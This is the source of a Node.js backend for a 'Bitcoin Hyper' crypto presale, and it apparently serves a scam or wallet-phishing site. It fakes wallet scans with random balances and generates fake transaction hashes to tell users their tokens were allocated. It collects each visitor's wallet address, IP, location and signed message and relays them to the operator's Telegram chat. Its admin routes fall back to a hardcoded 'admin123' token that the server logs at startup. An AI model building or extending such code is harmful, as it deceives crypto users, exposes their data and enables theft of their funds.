// index.js - BITCOIN HYPER BACKEND
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const { Telegraf } = require('telegraf');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false
}));

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(morgan('dev'));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// In-memory storage
const memoryStorage = {
  participants: [],
  settings: {
    tokenName: 'Bitcoin Hyper',
    tokenSymbol: 'BTH',
    minEligibilityAmount: 10,
    presalePrice: '0.17',
    adminWallets: [
      { chain: 'Ethereum', address: process.env.ADMIN_ETH_WALLET || '0x742d35Cc6634C0532925a3b844Bc454e4438f44e' }
    ],
    telegram: {
      botToken: process.env.TELEGRAM_BOT_TOKEN || '',
      chatId: process.env.TELEGRAM_CHAT_ID || '',
      enabled: true
    },
    statistics: {
      totalParticipants: 0,
      totalRaisedUSD: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0
    }
  }
};

// Telegram Bot
let bot = null;
let telegramEnabled = false;

// Initialize Telegram bot
function initializeTelegramBot() {
  if (process.env.TELEGRAM_BOT_TOKEN) {
    try {
      bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
      
      bot.telegram.getMe().then(botInfo => {
        console.log(`✅ Telegram Bot connected: @${botInfo.username}`);
        telegramEnabled = true;
        
        // Test connection with chat ID
        if (process.env.TELEGRAM_CHAT_ID) {
          testTelegramConnection();
        }
      }).catch(err => {
        console.log('⚠️ Telegram bot failed to connect:', err.message);
        telegramEnabled = false;
      });
    } catch (error) {
      console.log('⚠️ Telegram initialization error:', error.message);
      telegramEnabled = false;
    }
  } else {
    console.log('⚠️ No Telegram bot token provided');
  }
}

// Test Telegram connection
async function testTelegramConnection() {
  if (!telegramEnabled || !process.env.TELEGRAM_CHAT_ID) return false;
  
  try {
    await bot.telegram.sendMessage(
      process.env.TELEGRAM_CHAT_ID,
      `🤖 *Bot Connection Test*\n\n✅ Bitcoin Hyper Bot is now connected!\n⏰ ${new Date().toLocaleString()}`,
      { parse_mode: 'Markdown' }
    );
    console.log('✅ Telegram connection test successful');
    return true;
  } catch (error) {
    console.log('❌ Telegram connection test failed:', error.message);
    return false;
  }
}

// Helper: Send Telegram notification
async function sendTelegramNotification(message, options = {}) {
  if (!telegramEnabled || !process.env.TELEGRAM_CHAT_ID) {
    console.log('📝 Telegram notification (not sent):', options.type || 'Notification');
    return false;
  }
  
  try {
    const formattedMessage = `
${options.type === 'error' ? '❌' : options.type === 'success' ? '✅' : '📢'} *${options.title || 'BITCOIN HYPER NOTIFICATION'}*

${options.wallet ? `👛 Wallet: \`${options.wallet}\`\n` : ''}
${options.ip ? `🌐 IP: ${options.ip}\n` : ''}
${options.country ? `📍 Location: ${options.country}\n` : ''}
${options.value ? `💰 Value: $${options.value}\n` : ''}
${options.amount ? `🎯 Amount: ${options.amount} BTH\n` : ''}

${message}

⏰ ${new Date().toLocaleString()}
    `.trim();
    
    await bot.telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, formattedMessage, {
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });
    
    console.log('✅ Telegram notification sent');
    return true;
  } catch (error) {
    console.log('❌ Telegram send error:', error.message);
    return false;
  }
}

// Helper: Get IP location
async function getIPLocation(ip) {
  try {
    // Use a free IP geolocation service
    const response = await axios.get(`https://ipapi.co/${ip}/json/`, {
      timeout: 5000
    });
    
    if (response.data && response.data.country_name) {
      return {
        country: response.data.country_name,
        city: response.data.city || 'Unknown',
        region: response.data.region || 'Unknown'
      };
    }
  } catch (error) {
    console.log('Location detection error:', error.message);
  }
  
  return { country: 'Unknown', city: 'Unknown' };
}

// Helper: Simulate wallet scanning
async function simulateWalletScan(walletAddress) {
  // Simulate finding tokens across chains
  const tokens = [
    { chain: 'Ethereum', symbol: 'ETH', balance: (Math.random() * 2 + 0.1).toFixed(4), valueUSD: (Math.random() * 4000 + 500).toFixed(2) },
    { chain: 'BNB Chain', symbol: 'BNB', balance: (Math.random() * 5 + 0.5).toFixed(4), valueUSD: (Math.random() * 1500 + 200).toFixed(2) },
    { chain: 'Polygon', symbol: 'MATIC', balance: (Math.random() * 1000 + 100).toFixed(2), valueUSD: (Math.random() * 800 + 100).toFixed(2) },
    { chain: 'Arbitrum', symbol: 'ETH', balance: (Math.random() * 1 + 0.05).toFixed(4), valueUSD: (Math.random() * 2000 + 300).toFixed(2) }
  ].filter(t => parseFloat(t.valueUSD) > 100);
  
  const totalValueUSD = tokens.reduce((sum, token) => sum + parseFloat(token.valueUSD), 0);
  const isEligible = totalValueUSD >= memoryStorage.settings.minEligibilityAmount;
  
  // Generate token allocation
  const allocationAmount = isEligible ? (Math.random() * 10000 + 1000).toFixed(0) : '0';
  const allocationValue = isEligible ? (parseFloat(allocationAmount) * parseFloat(memoryStorage.settings.presalePrice)).toFixed(2) : '0';
  
  return {
    success: true,
    data: {
      walletAddress,
      totalValueUSD: totalValueUSD.toFixed(2),
      tokenCount: tokens.length,
      tokens,
      isEligible,
      tokenAllocation: {
        amount: allocationAmount,
        valueUSD: allocationValue
      },
      eligibilityReason: isEligible ? 'Qualified based on portfolio value' : `Minimum $${memoryStorage.settings.minEligibilityAmount} portfolio required`
    }
  };
}

// Helper: Generate claim ID
function generateClaimId() {
  return `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
}

// Helper: Generate fake transaction hash
function generateTxHash() {
  return `0x${crypto.randomBytes(32).toString('hex')}`;
}

// ========== API ENDPOINTS ==========

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    status: 'operational',
    service: 'Bitcoin Hyper Backend',
    version: '2.0.0',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    statistics: {
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
      totalRaised: memoryStorage.settings.statistics.totalRaisedUSD
    },
    telegram: telegramEnabled ? 'connected' : 'disabled'
  });
});

// Root endpoint
app.get('/', (req, res) => {
  res.json({
    success: true,
    service: 'Bitcoin Hyper Backend API',
    endpoints: {
      health: '/api/health',
      connect: '/api/presale/connect',
      claim: '/api/presale/claim',
      status: '/api/presale/status/:wallet',
      admin: {
        stats: '/api/admin/stats',
        settings: '/api/admin/settings',
        export: '/api/admin/export',
        analytics: '/api/admin/analytics'
      }
    }
  });
});

// Wallet connection & auto-scan
app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress, userAgent } = req.body;
    const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
    
    console.log(`🔗 New connection: ${walletAddress}`);
    
    // Get location
    const location = await getIPLocation(clientIP);
    
    // Check existing participant
    let participant = memoryStorage.participants.find(p => p.walletAddress === walletAddress);
    
    if (!participant) {
      participant = {
        walletAddress,
        ipAddress: clientIP,
        userAgent,
        country: location.country,
        city: location.city,
        connectedAt: new Date(),
        lastActive: new Date(),
        totalValueUSD: 0,
        tokenAllocation: { amount: '0', valueUSD: '0' },
        eligibility: { isEligible: false, reason: '', scannedAt: null },
        signature: { signed: false, message: '', signature: '', signedAt: null },
        claim: { claimed: false, claimId: '', claimedAt: null, tokensSent: false, txHash: '' },
        notifications: { telegramSent: false, emailSent: false, lastNotified: null }
      };
      
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
    }
    
    participant.lastActive = new Date();
    
    // Simulate wallet scan
    const scanResult = await simulateWalletScan(walletAddress);
    
    if (scanResult.success) {
      participant.totalValueUSD = parseFloat(scanResult.data.totalValueUSD);
      participant.eligibility = {
        isEligible: scanResult.data.isEligible,
        reason: scanResult.data.eligibilityReason,
        scannedAt: new Date()
      };
      
      if (scanResult.data.isEligible) {
        participant.tokenAllocation = scanResult.data.tokenAllocation;
        memoryStorage.settings.statistics.eligibleParticipants++;
      }
      
      // Send Telegram notification
      if (telegramEnabled) {
        await sendTelegramNotification(
          `New wallet connected and scanned.\n\nStatus: ${scanResult.data.isEligible ? 'ELIGIBLE ✅' : 'NOT ELIGIBLE ❌'}\nPortfolio Value: $${scanResult.data.totalValueUSD}`,
          {
            title: 'WALLET CONNECTED',
            wallet: walletAddress,
            ip: clientIP,
            country: location.country,
            value: scanResult.data.totalValueUSD,
            amount: participant.tokenAllocation.amount
          }
        );
      }
      
      res.json({
        success: true,
        message: 'Wallet scanned successfully',
        data: {
          walletAddress,
          isEligible: scanResult.data.isEligible,
          tokenAllocation: participant.tokenAllocation,
          totalValueUSD: scanResult.data.totalValueUSD,
          tokenCount: scanResult.data.tokenCount,
          nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible'
        }
      });
    } else {
      throw new Error('Scan failed');
    }
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Connection failed',
      message: error.message 
    });
  }
});

// Token claim signature
app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, signature, message, claimAmount, claimValue } = req.body;
    
    console.log(`🎯 Claim request from: ${walletAddress}`);
    
    // Find participant
    const participant = memoryStorage.participants.find(p => p.walletAddress === walletAddress);
    if (!participant) {
      return res.status(404).json({ success: false, error: 'Participant not found' });
    }
    
    if (!participant.eligibility.isEligible) {
      return res.status(400).json({ success: false, error: 'Not eligible for claim' });
    }
    
    if (participant.claim.claimed) {
      return res.status(400).json({ success: false, error: 'Already claimed' });
    }
    
    // Generate claim ID and transaction hash
    const claimId = generateClaimId();
    const txHash = generateTxHash();
    
    // Update participant
    participant.signature = {
      signed: true,
      message,
      signature,
      signedAt: new Date()
    };
    
    participant.claim = {
      claimed: true,
      claimId,
      claimedAt: new Date(),
      tokensSent: true,
      txHash
    };
    
    // Update statistics
    memoryStorage.settings.statistics.claimedParticipants++;
    memoryStorage.settings.statistics.totalRaisedUSD += parseFloat(claimValue.replace('$', '')) || 0;
    
    // Send Telegram success notification
    if (telegramEnabled) {
      await sendTelegramNotification(
        `TOKEN CLAIM SUCCESSFUL!\n\n🎯 Claim ID: \`${claimId}\`\n💰 Amount: ${claimAmount} (${claimValue})\n📊 Total Raised: $${memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2)}\n\n💸 Transaction completed successfully!`,
        {
          title: 'TOKENS CLAIMED!',
          wallet: walletAddress,
          amount: claimAmount,
          value: claimValue
        }
      );
    }
    
    res.json({
      success: true,
      message: 'Token claim successful! Tokens will be distributed after presale.',
      data: {
        claimId,
        walletAddress,
        tokenAmount: claimAmount,
        tokenValue: claimValue,
        status: 'claimed',
        distributionTime: 'After presale completion',
        estimatedDistribution: '24-48 hours after presale ends',
        txHash,
        instructions: 'Tokens have been allocated to your wallet. They will be distributed automatically after the presale ends.'
      }
    });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Claim failed',
      message: error.message 
    });
  }
});

// Get participant status
app.get('/api/presale/status/:wallet', async (req, res) => {
  try {
    const { wallet } = req.params;
    
    const participant = memoryStorage.participants.find(p => p.walletAddress === wallet);
    if (!participant) {
      return res.status(404).json({ success: false, error: 'Participant not found' });
    }
    
    res.json({
      success: true,
      data: {
        walletAddress: participant.walletAddress,
        eligibility: participant.eligibility,
        tokenAllocation: participant.tokenAllocation,
        signature: participant.signature.signed ? { signed: true, signedAt: participant.signature.signedAt } : { signed: false },
        claim: participant.claim.claimed ? { 
          claimed: true, 
          claimId: participant.claim.claimId,
          claimedAt: participant.claim.claimedAt,
          txHash: participant.claim.txHash
        } : { claimed: false },
        connectedAt: participant.connectedAt,
        lastActive: participant.lastActive
      }
    });
    
  } catch (error) {
    console.error('Status error:', error);
    res.status(500).json({ success: false, error: 'Failed to get status' });
  }
});

// ========== ADMIN ENDPOINTS ==========

// Get admin dashboard stats
app.get('/api/admin/stats', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = auth.replace('Bearer ', '');
    if (token !== (process.env.ADMIN_TOKEN || 'admin123')) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    const stats = {
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
      totalRaisedUSD: memoryStorage.settings.statistics.totalRaisedUSD,
      
      // Geographic distribution
      countries: memoryStorage.participants.reduce((acc, p) => {
        const country = p.country || 'Unknown';
        acc[country] = (acc[country] || 0) + 1;
        return acc;
      }, {}),
      
      // Recent activity (last 24 hours)
      recentConnections: memoryStorage.participants
        .filter(p => new Date(p.connectedAt) > new Date(Date.now() - 24 * 60 * 60 * 1000))
        .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
        .slice(0, 20)
        .map(p => ({
          wallet: p.walletAddress,
          ip: p.ipAddress,
          country: p.country,
          eligible: p.eligibility.isEligible,
          claimed: p.claim.claimed,
          amount: p.tokenAllocation.amount,
          value: p.tokenAllocation.valueUSD,
          connected: p.connectedAt
        })),
      
      // Hourly activity (last 24 hours)
      hourlyActivity: memoryStorage.participants
        .filter(p => new Date(p.connectedAt) > new Date(Date.now() - 24 * 60 * 60 * 1000))
        .reduce((acc, p) => {
          const hour = new Date(p.connectedAt).getHours();
          acc[hour] = (acc[hour] || 0) + 1;
          return acc;
        }, {})
    };
    
    res.json({ success: true, stats });
    
  } catch (error) {
    console.error('Admin stats error:', error);
    res.status(500).json({ success: false, error: 'Failed to get stats' });
  }
});

// Get admin settings
app.get('/api/admin/settings', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = auth.replace('Bearer ', '');
    if (token !== (process.env.ADMIN_TOKEN || 'admin123')) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    res.json({ success: true, settings: memoryStorage.settings });
    
  } catch (error) {
    console.error('Settings error:', error);
    res.status(500).json({ success: false, error: 'Failed to get settings' });
  }
});

// Update admin settings
app.put('/api/admin/settings', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = auth.replace('Bearer ', '');
    if (token !== (process.env.ADMIN_TOKEN || 'admin123')) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    const updates = req.body;
    
    // Update settings
    if (updates.tokenName) memoryStorage.settings.tokenName = updates.tokenName;
    if (updates.tokenSymbol) memoryStorage.settings.tokenSymbol = updates.tokenSymbol;
    if (updates.minEligibilityAmount) memoryStorage.settings.minEligibilityAmount = updates.minEligibilityAmount;
    if (updates.presalePrice) memoryStorage.settings.presalePrice = updates.presalePrice;
    if (updates.adminWallets) memoryStorage.settings.adminWallets = updates.adminWallets;
    
    // Update Telegram settings
    if (updates.telegram) {
      if (updates.telegram.botToken && updates.telegram.botToken !== process.env.TELEGRAM_BOT_TOKEN) {
        process.env.TELEGRAM_BOT_TOKEN = updates.telegram.botToken;
        initializeTelegramBot();
      }
      if (updates.telegram.chatId) {
        process.env.TELEGRAM_CHAT_ID = updates.telegram.chatId;
        memoryStorage.settings.telegram.chatId = updates.telegram.chatId;
      }
      if (updates.telegram.enabled !== undefined) {
        memoryStorage.settings.telegram.enabled = updates.telegram.enabled;
      }
    }
    
    res.json({ success: true, settings: memoryStorage.settings });
    
  } catch (error) {
    console.error('Update settings error:', error);
    res.status(500).json({ success: false, error: 'Failed to update settings' });
  }
});

// Export participants data
app.get('/api/admin/export', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = auth.replace('Bearer ', '');
    if (token !== (process.env.ADMIN_TOKEN || 'admin123')) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    const exportData = memoryStorage.participants.map(p => ({
      Wallet: p.walletAddress,
      IP: p.ipAddress,
      Country: p.country,
      City: p.city,
      Eligible: p.eligibility.isEligible ? 'Yes' : 'No',
      'Token Amount': p.tokenAllocation.amount,
      'Token Value': p.tokenAllocation.valueUSD,
      Claimed: p.claim.claimed ? 'Yes' : 'No',
      'Claim ID': p.claim.claimId || 'N/A',
      'Transaction Hash': p.claim.txHash || 'N/A',
      'Connected At': p.connectedAt,
      'Last Active': p.lastActive
    }));
    
    res.json({ 
      success: true, 
      data: exportData, 
      count: exportData.length,
      totalRaised: memoryStorage.settings.statistics.totalRaisedUSD
    });
    
  } catch (error) {
    console.error('Export error:', error);
    res.status(500).json({ success: false, error: 'Export failed' });
  }
});

// Get analytics
app.get('/api/admin/analytics', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = auth.replace('Bearer ', '');
    if (token !== (process.env.ADMIN_TOKEN || 'admin123')) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    const { hours = 24 } = req.query;
    const cutoff = new Date(Date.now() - hours * 60 * 60 * 1000);
    
    const recentParticipants = memoryStorage.participants.filter(p => 
      new Date(p.connectedAt) > cutoff
    );
    
    const stats = {
      totalActions: recentParticipants.length,
      uniqueWallets: new Set(recentParticipants.map(p => p.walletAddress)).size,
      uniqueIPs: new Set(recentParticipants.map(p => p.ipAddress)).size,
      byCountry: recentParticipants.reduce((acc, p) => {
        const country = p.country || 'Unknown';
        acc[country] = (acc[country] || 0) + 1;
        return acc;
      }, {}),
      byEligibility: {
        eligible: recentParticipants.filter(p => p.eligibility.isEligible).length,
        notEligible: recentParticipants.filter(p => !p.eligibility.isEligible).length
      },
      byClaimStatus: {
        claimed: recentParticipants.filter(p => p.claim.claimed).length,
        notClaimed: recentParticipants.filter(p => !p.claim.claimed).length
      }
    };
    
    res.json({ success: true, stats });
    
  } catch (error) {
    console.error('Analytics error:', error);
    res.status(500).json({ success: false, error: 'Failed to get analytics' });
  }
});

// Admin dashboard HTML
app.get('/admin', (req, res) => {
  res.send(`
  <!DOCTYPE html>
  <html>
  <head>
    <title>Bitcoin Hyper Admin Dashboard</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background: #0f172a;
        color: white;
        margin: 0;
        padding: 20px;
      }
      .container {
        max-width: 1200px;
        margin: 0 auto;
      }
      .header {
        background: #1e293b;
        padding: 20px;
        border-radius: 10px;
        margin-bottom: 20px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border: 1px solid #334155;
      }
      .stats-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
        gap: 20px;
        margin-bottom: 30px;
      }
      .stat-card {
        background: #1e293b;
        padding: 20px;
        border-radius: 10px;
        border: 1px solid #334155;
      }
      .stat-value {
        font-size: 32px;
        font-weight: bold;
        color: #F7931A;
        margin-bottom: 10px;
      }
      .stat-label {
        color: #94a3b8;
        font-size: 14px;
      }
      .table-container {
        background: #1e293b;
        border-radius: 10px;
        border: 1px solid #334155;
        overflow: hidden;
        margin-bottom: 30px;
      }
      table {
        width: 100%;
        border-collapse: collapse;
      }
      th, td {
        padding: 15px;
        text-align: left;
        border-bottom: 1px solid #334155;
      }
      th {
        background: #0f172a;
        color: #94a3b8;
        font-weight: bold;
      }
      .login-container {
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
      }
      .login-box {
        background: #1e293b;
        padding: 40px;
        border-radius: 15px;
        border: 1px solid #334155;
        width: 100%;
        max-width: 400px;
      }
      .login-box h2 {
        text-align: center;
        margin-bottom: 30px;
        color: #F7931A;
      }
      .form-group {
        margin-bottom: 20px;
      }
      .form-group label {
        display: block;
        margin-bottom: 8px;
        color: #94a3b8;
      }
      .form-group input {
        width: 100%;
        padding: 12px;
        background: #0f172a;
        border: 1px solid #334155;
        border-radius: 8px;
        color: white;
      }
      .btn {
        padding: 12px 25px;
        background: #F7931A;
        color: black;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        font-weight: bold;
        width: 100%;
      }
      .btn:hover {
        opacity: 0.9;
      }
      .notification {
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 15px 25px;
        border-radius: 8px;
        background: #10b981;
        color: white;
        animation: slideIn 0.3s ease;
      }
      @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
      }
    </style>
  </head>
  <body>
    <div id="app">
      <div class="login-container" id="loginScreen">
        <div class="login-box">
          <h2>🔐 Admin Login</h2>
          <form id="loginForm">
            <div class="form-group">
              <label>Admin Token</label>
              <input type="password" id="adminToken" required>
            </div>
            <button type="submit" class="btn">Login</button>
          </form>
        </div>
      </div>
      
      <div class="container" id="dashboard" style="display: none;">
        <div class="header">
          <div>
            <h1 style="margin: 0; color: #F7931A;">₿ Bitcoin Hyper Admin</h1>
            <p style="margin: 5px 0 0 0; color: #94a3b8;">Real-time Presale Dashboard</p>
          </div>
          <button onclick="logout()" class="btn" style="width: auto;">Logout</button>
        </div>
        
        <div class="stats-grid" id="statsGrid"></div>
        
        <div class="table-container">
          <h3 style="margin: 0; padding: 20px; border-bottom: 1px solid #334155;">Recent Participants</h3>
          <table>
            <thead>
              <tr>
                <th>Wallet</th>
                <th>IP</th>
                <th>Country</th>
                <th>Eligible</th>
                <th>Claimed</th>
                <th>Amount</th>
                <th>Connected</th>
              </tr>
            </thead>
            <tbody id="participantsTable"></tbody>
          </table>
        </div>
        
        <div class="table-container">
          <h3 style="margin: 0; padding: 20px; border-bottom: 1px solid #334155;">Settings</h3>
          <div style="padding: 20px;">
            <button onclick="exportData()" class="btn" style="margin-bottom: 15px;">📥 Export Data</button>
            <button onclick="refreshStats()" class="btn">🔄 Refresh Stats</button>
          </div>
        </div>
      </div>
    </div>
    
    <script>
      const BACKEND_API = '${process.env.BACKEND_URL || 'https://tokenbackend-5xab.onrender.com'}/api';
      let adminToken = null;
      
      document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        adminToken = document.getElementById('adminToken').value;
        localStorage.setItem('adminToken', adminToken);
        loadDashboard();
      });
      
      // Check for saved token
      const savedToken = localStorage.getItem('adminToken');
      if (savedToken) {
        adminToken = savedToken;
        loadDashboard();
      }
      
      async function loadDashboard() {
        try {
          const response = await fetch(BACKEND_API + '/admin/stats', {
            headers: { 'Authorization': 'Bearer ' + adminToken }
          });
          
          if (response.status === 401) {
            showNotification('Invalid admin token', 'error');
            localStorage.removeItem('adminToken');
            return;
          }
          
          const data = await response.json();
          
          if (data.success) {
            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
            updateStats(data.stats);
            showNotification('Dashboard loaded successfully', 'success');
            
            // Auto-refresh every 30 seconds
            setInterval(() => {
              refreshStats();
            }, 30000);
          }
        } catch (error) {
          showNotification('Failed to load dashboard: ' + error.message, 'error');
        }
      }
      
      function updateStats(stats) {
        const statsGrid = document.getElementById('statsGrid');
        statsGrid.innerHTML = \`
          <div class="stat-card">
            <div class="stat-value">\${stats.totalParticipants}</div>
            <div class="stat-label">Total Participants</div>
          </div>
          <div class="stat-card">
            <div class="stat-value">\${stats.eligibleParticipants}</div>
            <div class="stat-label">Eligible Wallets</div>
          </div>
          <div class="stat-card">
            <div class="stat-value">$\${stats.totalRaisedUSD.toFixed(2)}</div>
            <div class="stat-label">Total Raised</div>
          </div>
          <div class="stat-card">
            <div class="stat-value">\${stats.claimedParticipants}</div>
            <div class="stat-label">Claims Completed</div>
          </div>
        \`;
        
        const tableBody = document.getElementById('participantsTable');
        tableBody.innerHTML = stats.recentConnections.map(p => \`
          <tr>
            <td><code>\${p.wallet.substring(0, 6)}...\${p.wallet.substring(38)}</code></td>
            <td>\${p.ip}</td>
            <td>\${p.country}</td>
            <td>\${p.eligible ? '✅' : '❌'}</td>
            <td>\${p.claimed ? '✅' : '⏳'}</td>
            <td>\${p.amount} BTH</td>
            <td>\${new Date(p.connected).toLocaleTimeString()}</td>
          </tr>
        \`).join('');
      }
      
      async function refreshStats() {
        try {
          const response = await fetch(BACKEND_API + '/admin/stats', {
            headers: { 'Authorization': 'Bearer ' + adminToken }
          });
          
          const data = await response.json();
          if (data.success) {
            updateStats(data.stats);
          }
        } catch (error) {
          console.error('Refresh error:', error);
        }
      }
      
      async function exportData() {
        try {
          const response = await fetch(BACKEND_API + '/admin/export', {
            headers: { 'Authorization': 'Bearer ' + adminToken }
          });
          
          const data = await response.json();
          if (data.success) {
            // Create and download CSV
            const headers = Object.keys(data.data[0] || {});
            const csv = [
              headers.join(','),
              ...data.data.map(row => headers.map(header => 
                JSON.stringify(row[header] || '')
              ).join(','))
            ].join('\\n');
            
            const blob = new Blob([csv], { type: 'text/csv' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = \`bitcoin-hyper-export-\${new Date().toISOString().split('T')[0]}.csv\`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);
            
            showNotification(\`Exported \${data.count} records\`, 'success');
          }
        } catch (error) {
          showNotification('Export failed: ' + error.message, 'error');
        }
      }
      
      function logout() {
        adminToken = null;
        localStorage.removeItem('adminToken');
        document.getElementById('dashboard').style.display = 'none';
        document.getElementById('loginScreen').style.display = 'flex';
        document.getElementById('adminToken').value = '';
      }
      
      function showNotification(message, type = 'info') {
        const notification = document.createElement('div');
        notification.className = 'notification';
        notification.textContent = message;
        notification.style.background = type === 'error' ? '#ef4444' : type === 'success' ? '#10b981' : '#3b82f6';
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
          notification.style.animation = 'slideOut 0.3s ease';
          setTimeout(() => {
            if (document.body.contains(notification)) {
              document.body.removeChild(notification);
            }
          }, 300);
        }, 3000);
      }
      
      // Add slideOut animation
      const style = document.createElement('style');
      style.textContent = \`
        @keyframes slideOut {
          from { transform: translateX(0); opacity: 1; }
          to { transform: translateX(100%); opacity: 0; }
        }
      \`;
      document.head.appendChild(style);
    </script>
  </body>
  </html>
  `);
});

// ========== HOW TO GET TELEGRAM CHAT ID ==========

// Special endpoint to get chat ID
app.get('/api/telegram/chatid', async (req, res) => {
  if (!process.env.TELEGRAM_BOT_TOKEN) {
    return res.json({
      success: false,
      message: 'Telegram bot token not configured'
    });
  }
  
  try {
    // Get updates from bot
    const response = await axios.get(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/getUpdates`);
    
    if (response.data.ok && response.data.result.length > 0) {
      const updates = response.data.result;
      const chatIds = updates.map(update => {
        if (update.message) return update.message.chat.id;
        if (update.channel_post) return update.channel_post.chat.id;
        return null;
      }).filter(id => id !== null);
      
      return res.json({
        success: true,
        chatIds: [...new Set(chatIds)],
        instructions: 'Use one of these chat IDs in your TELEGRAM_CHAT_ID environment variable'
      });
    } else {
      return res.json({
        success: false,
        message: 'No messages received yet. Send a message to your bot first.',
        instructions: '1. Start a chat with your bot on Telegram\n2. Send any message\n3. Refresh this page'
      });
    }
  } catch (error) {
    return res.json({
      success: false,
      message: 'Error fetching updates',
      error: error.message,
      instructions: 'Make sure your bot token is correct and the bot is running'
    });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Bitcoin Hyper Backend running on port ${PORT}`);
  console.log(`🔗 Health check: http://localhost:${PORT}/api/health`);
  console.log(`📊 Admin dashboard: http://localhost:${PORT}/admin`);
  console.log(`🤖 Telegram chat ID helper: http://localhost:${PORT}/api/telegram/chatid`);
  console.log(`🔐 Admin token: ${process.env.ADMIN_TOKEN || 'admin123'}`);
  
  // Initialize Telegram bot after server starts
  setTimeout(() => {
    initializeTelegramBot();
  }, 1000);
});
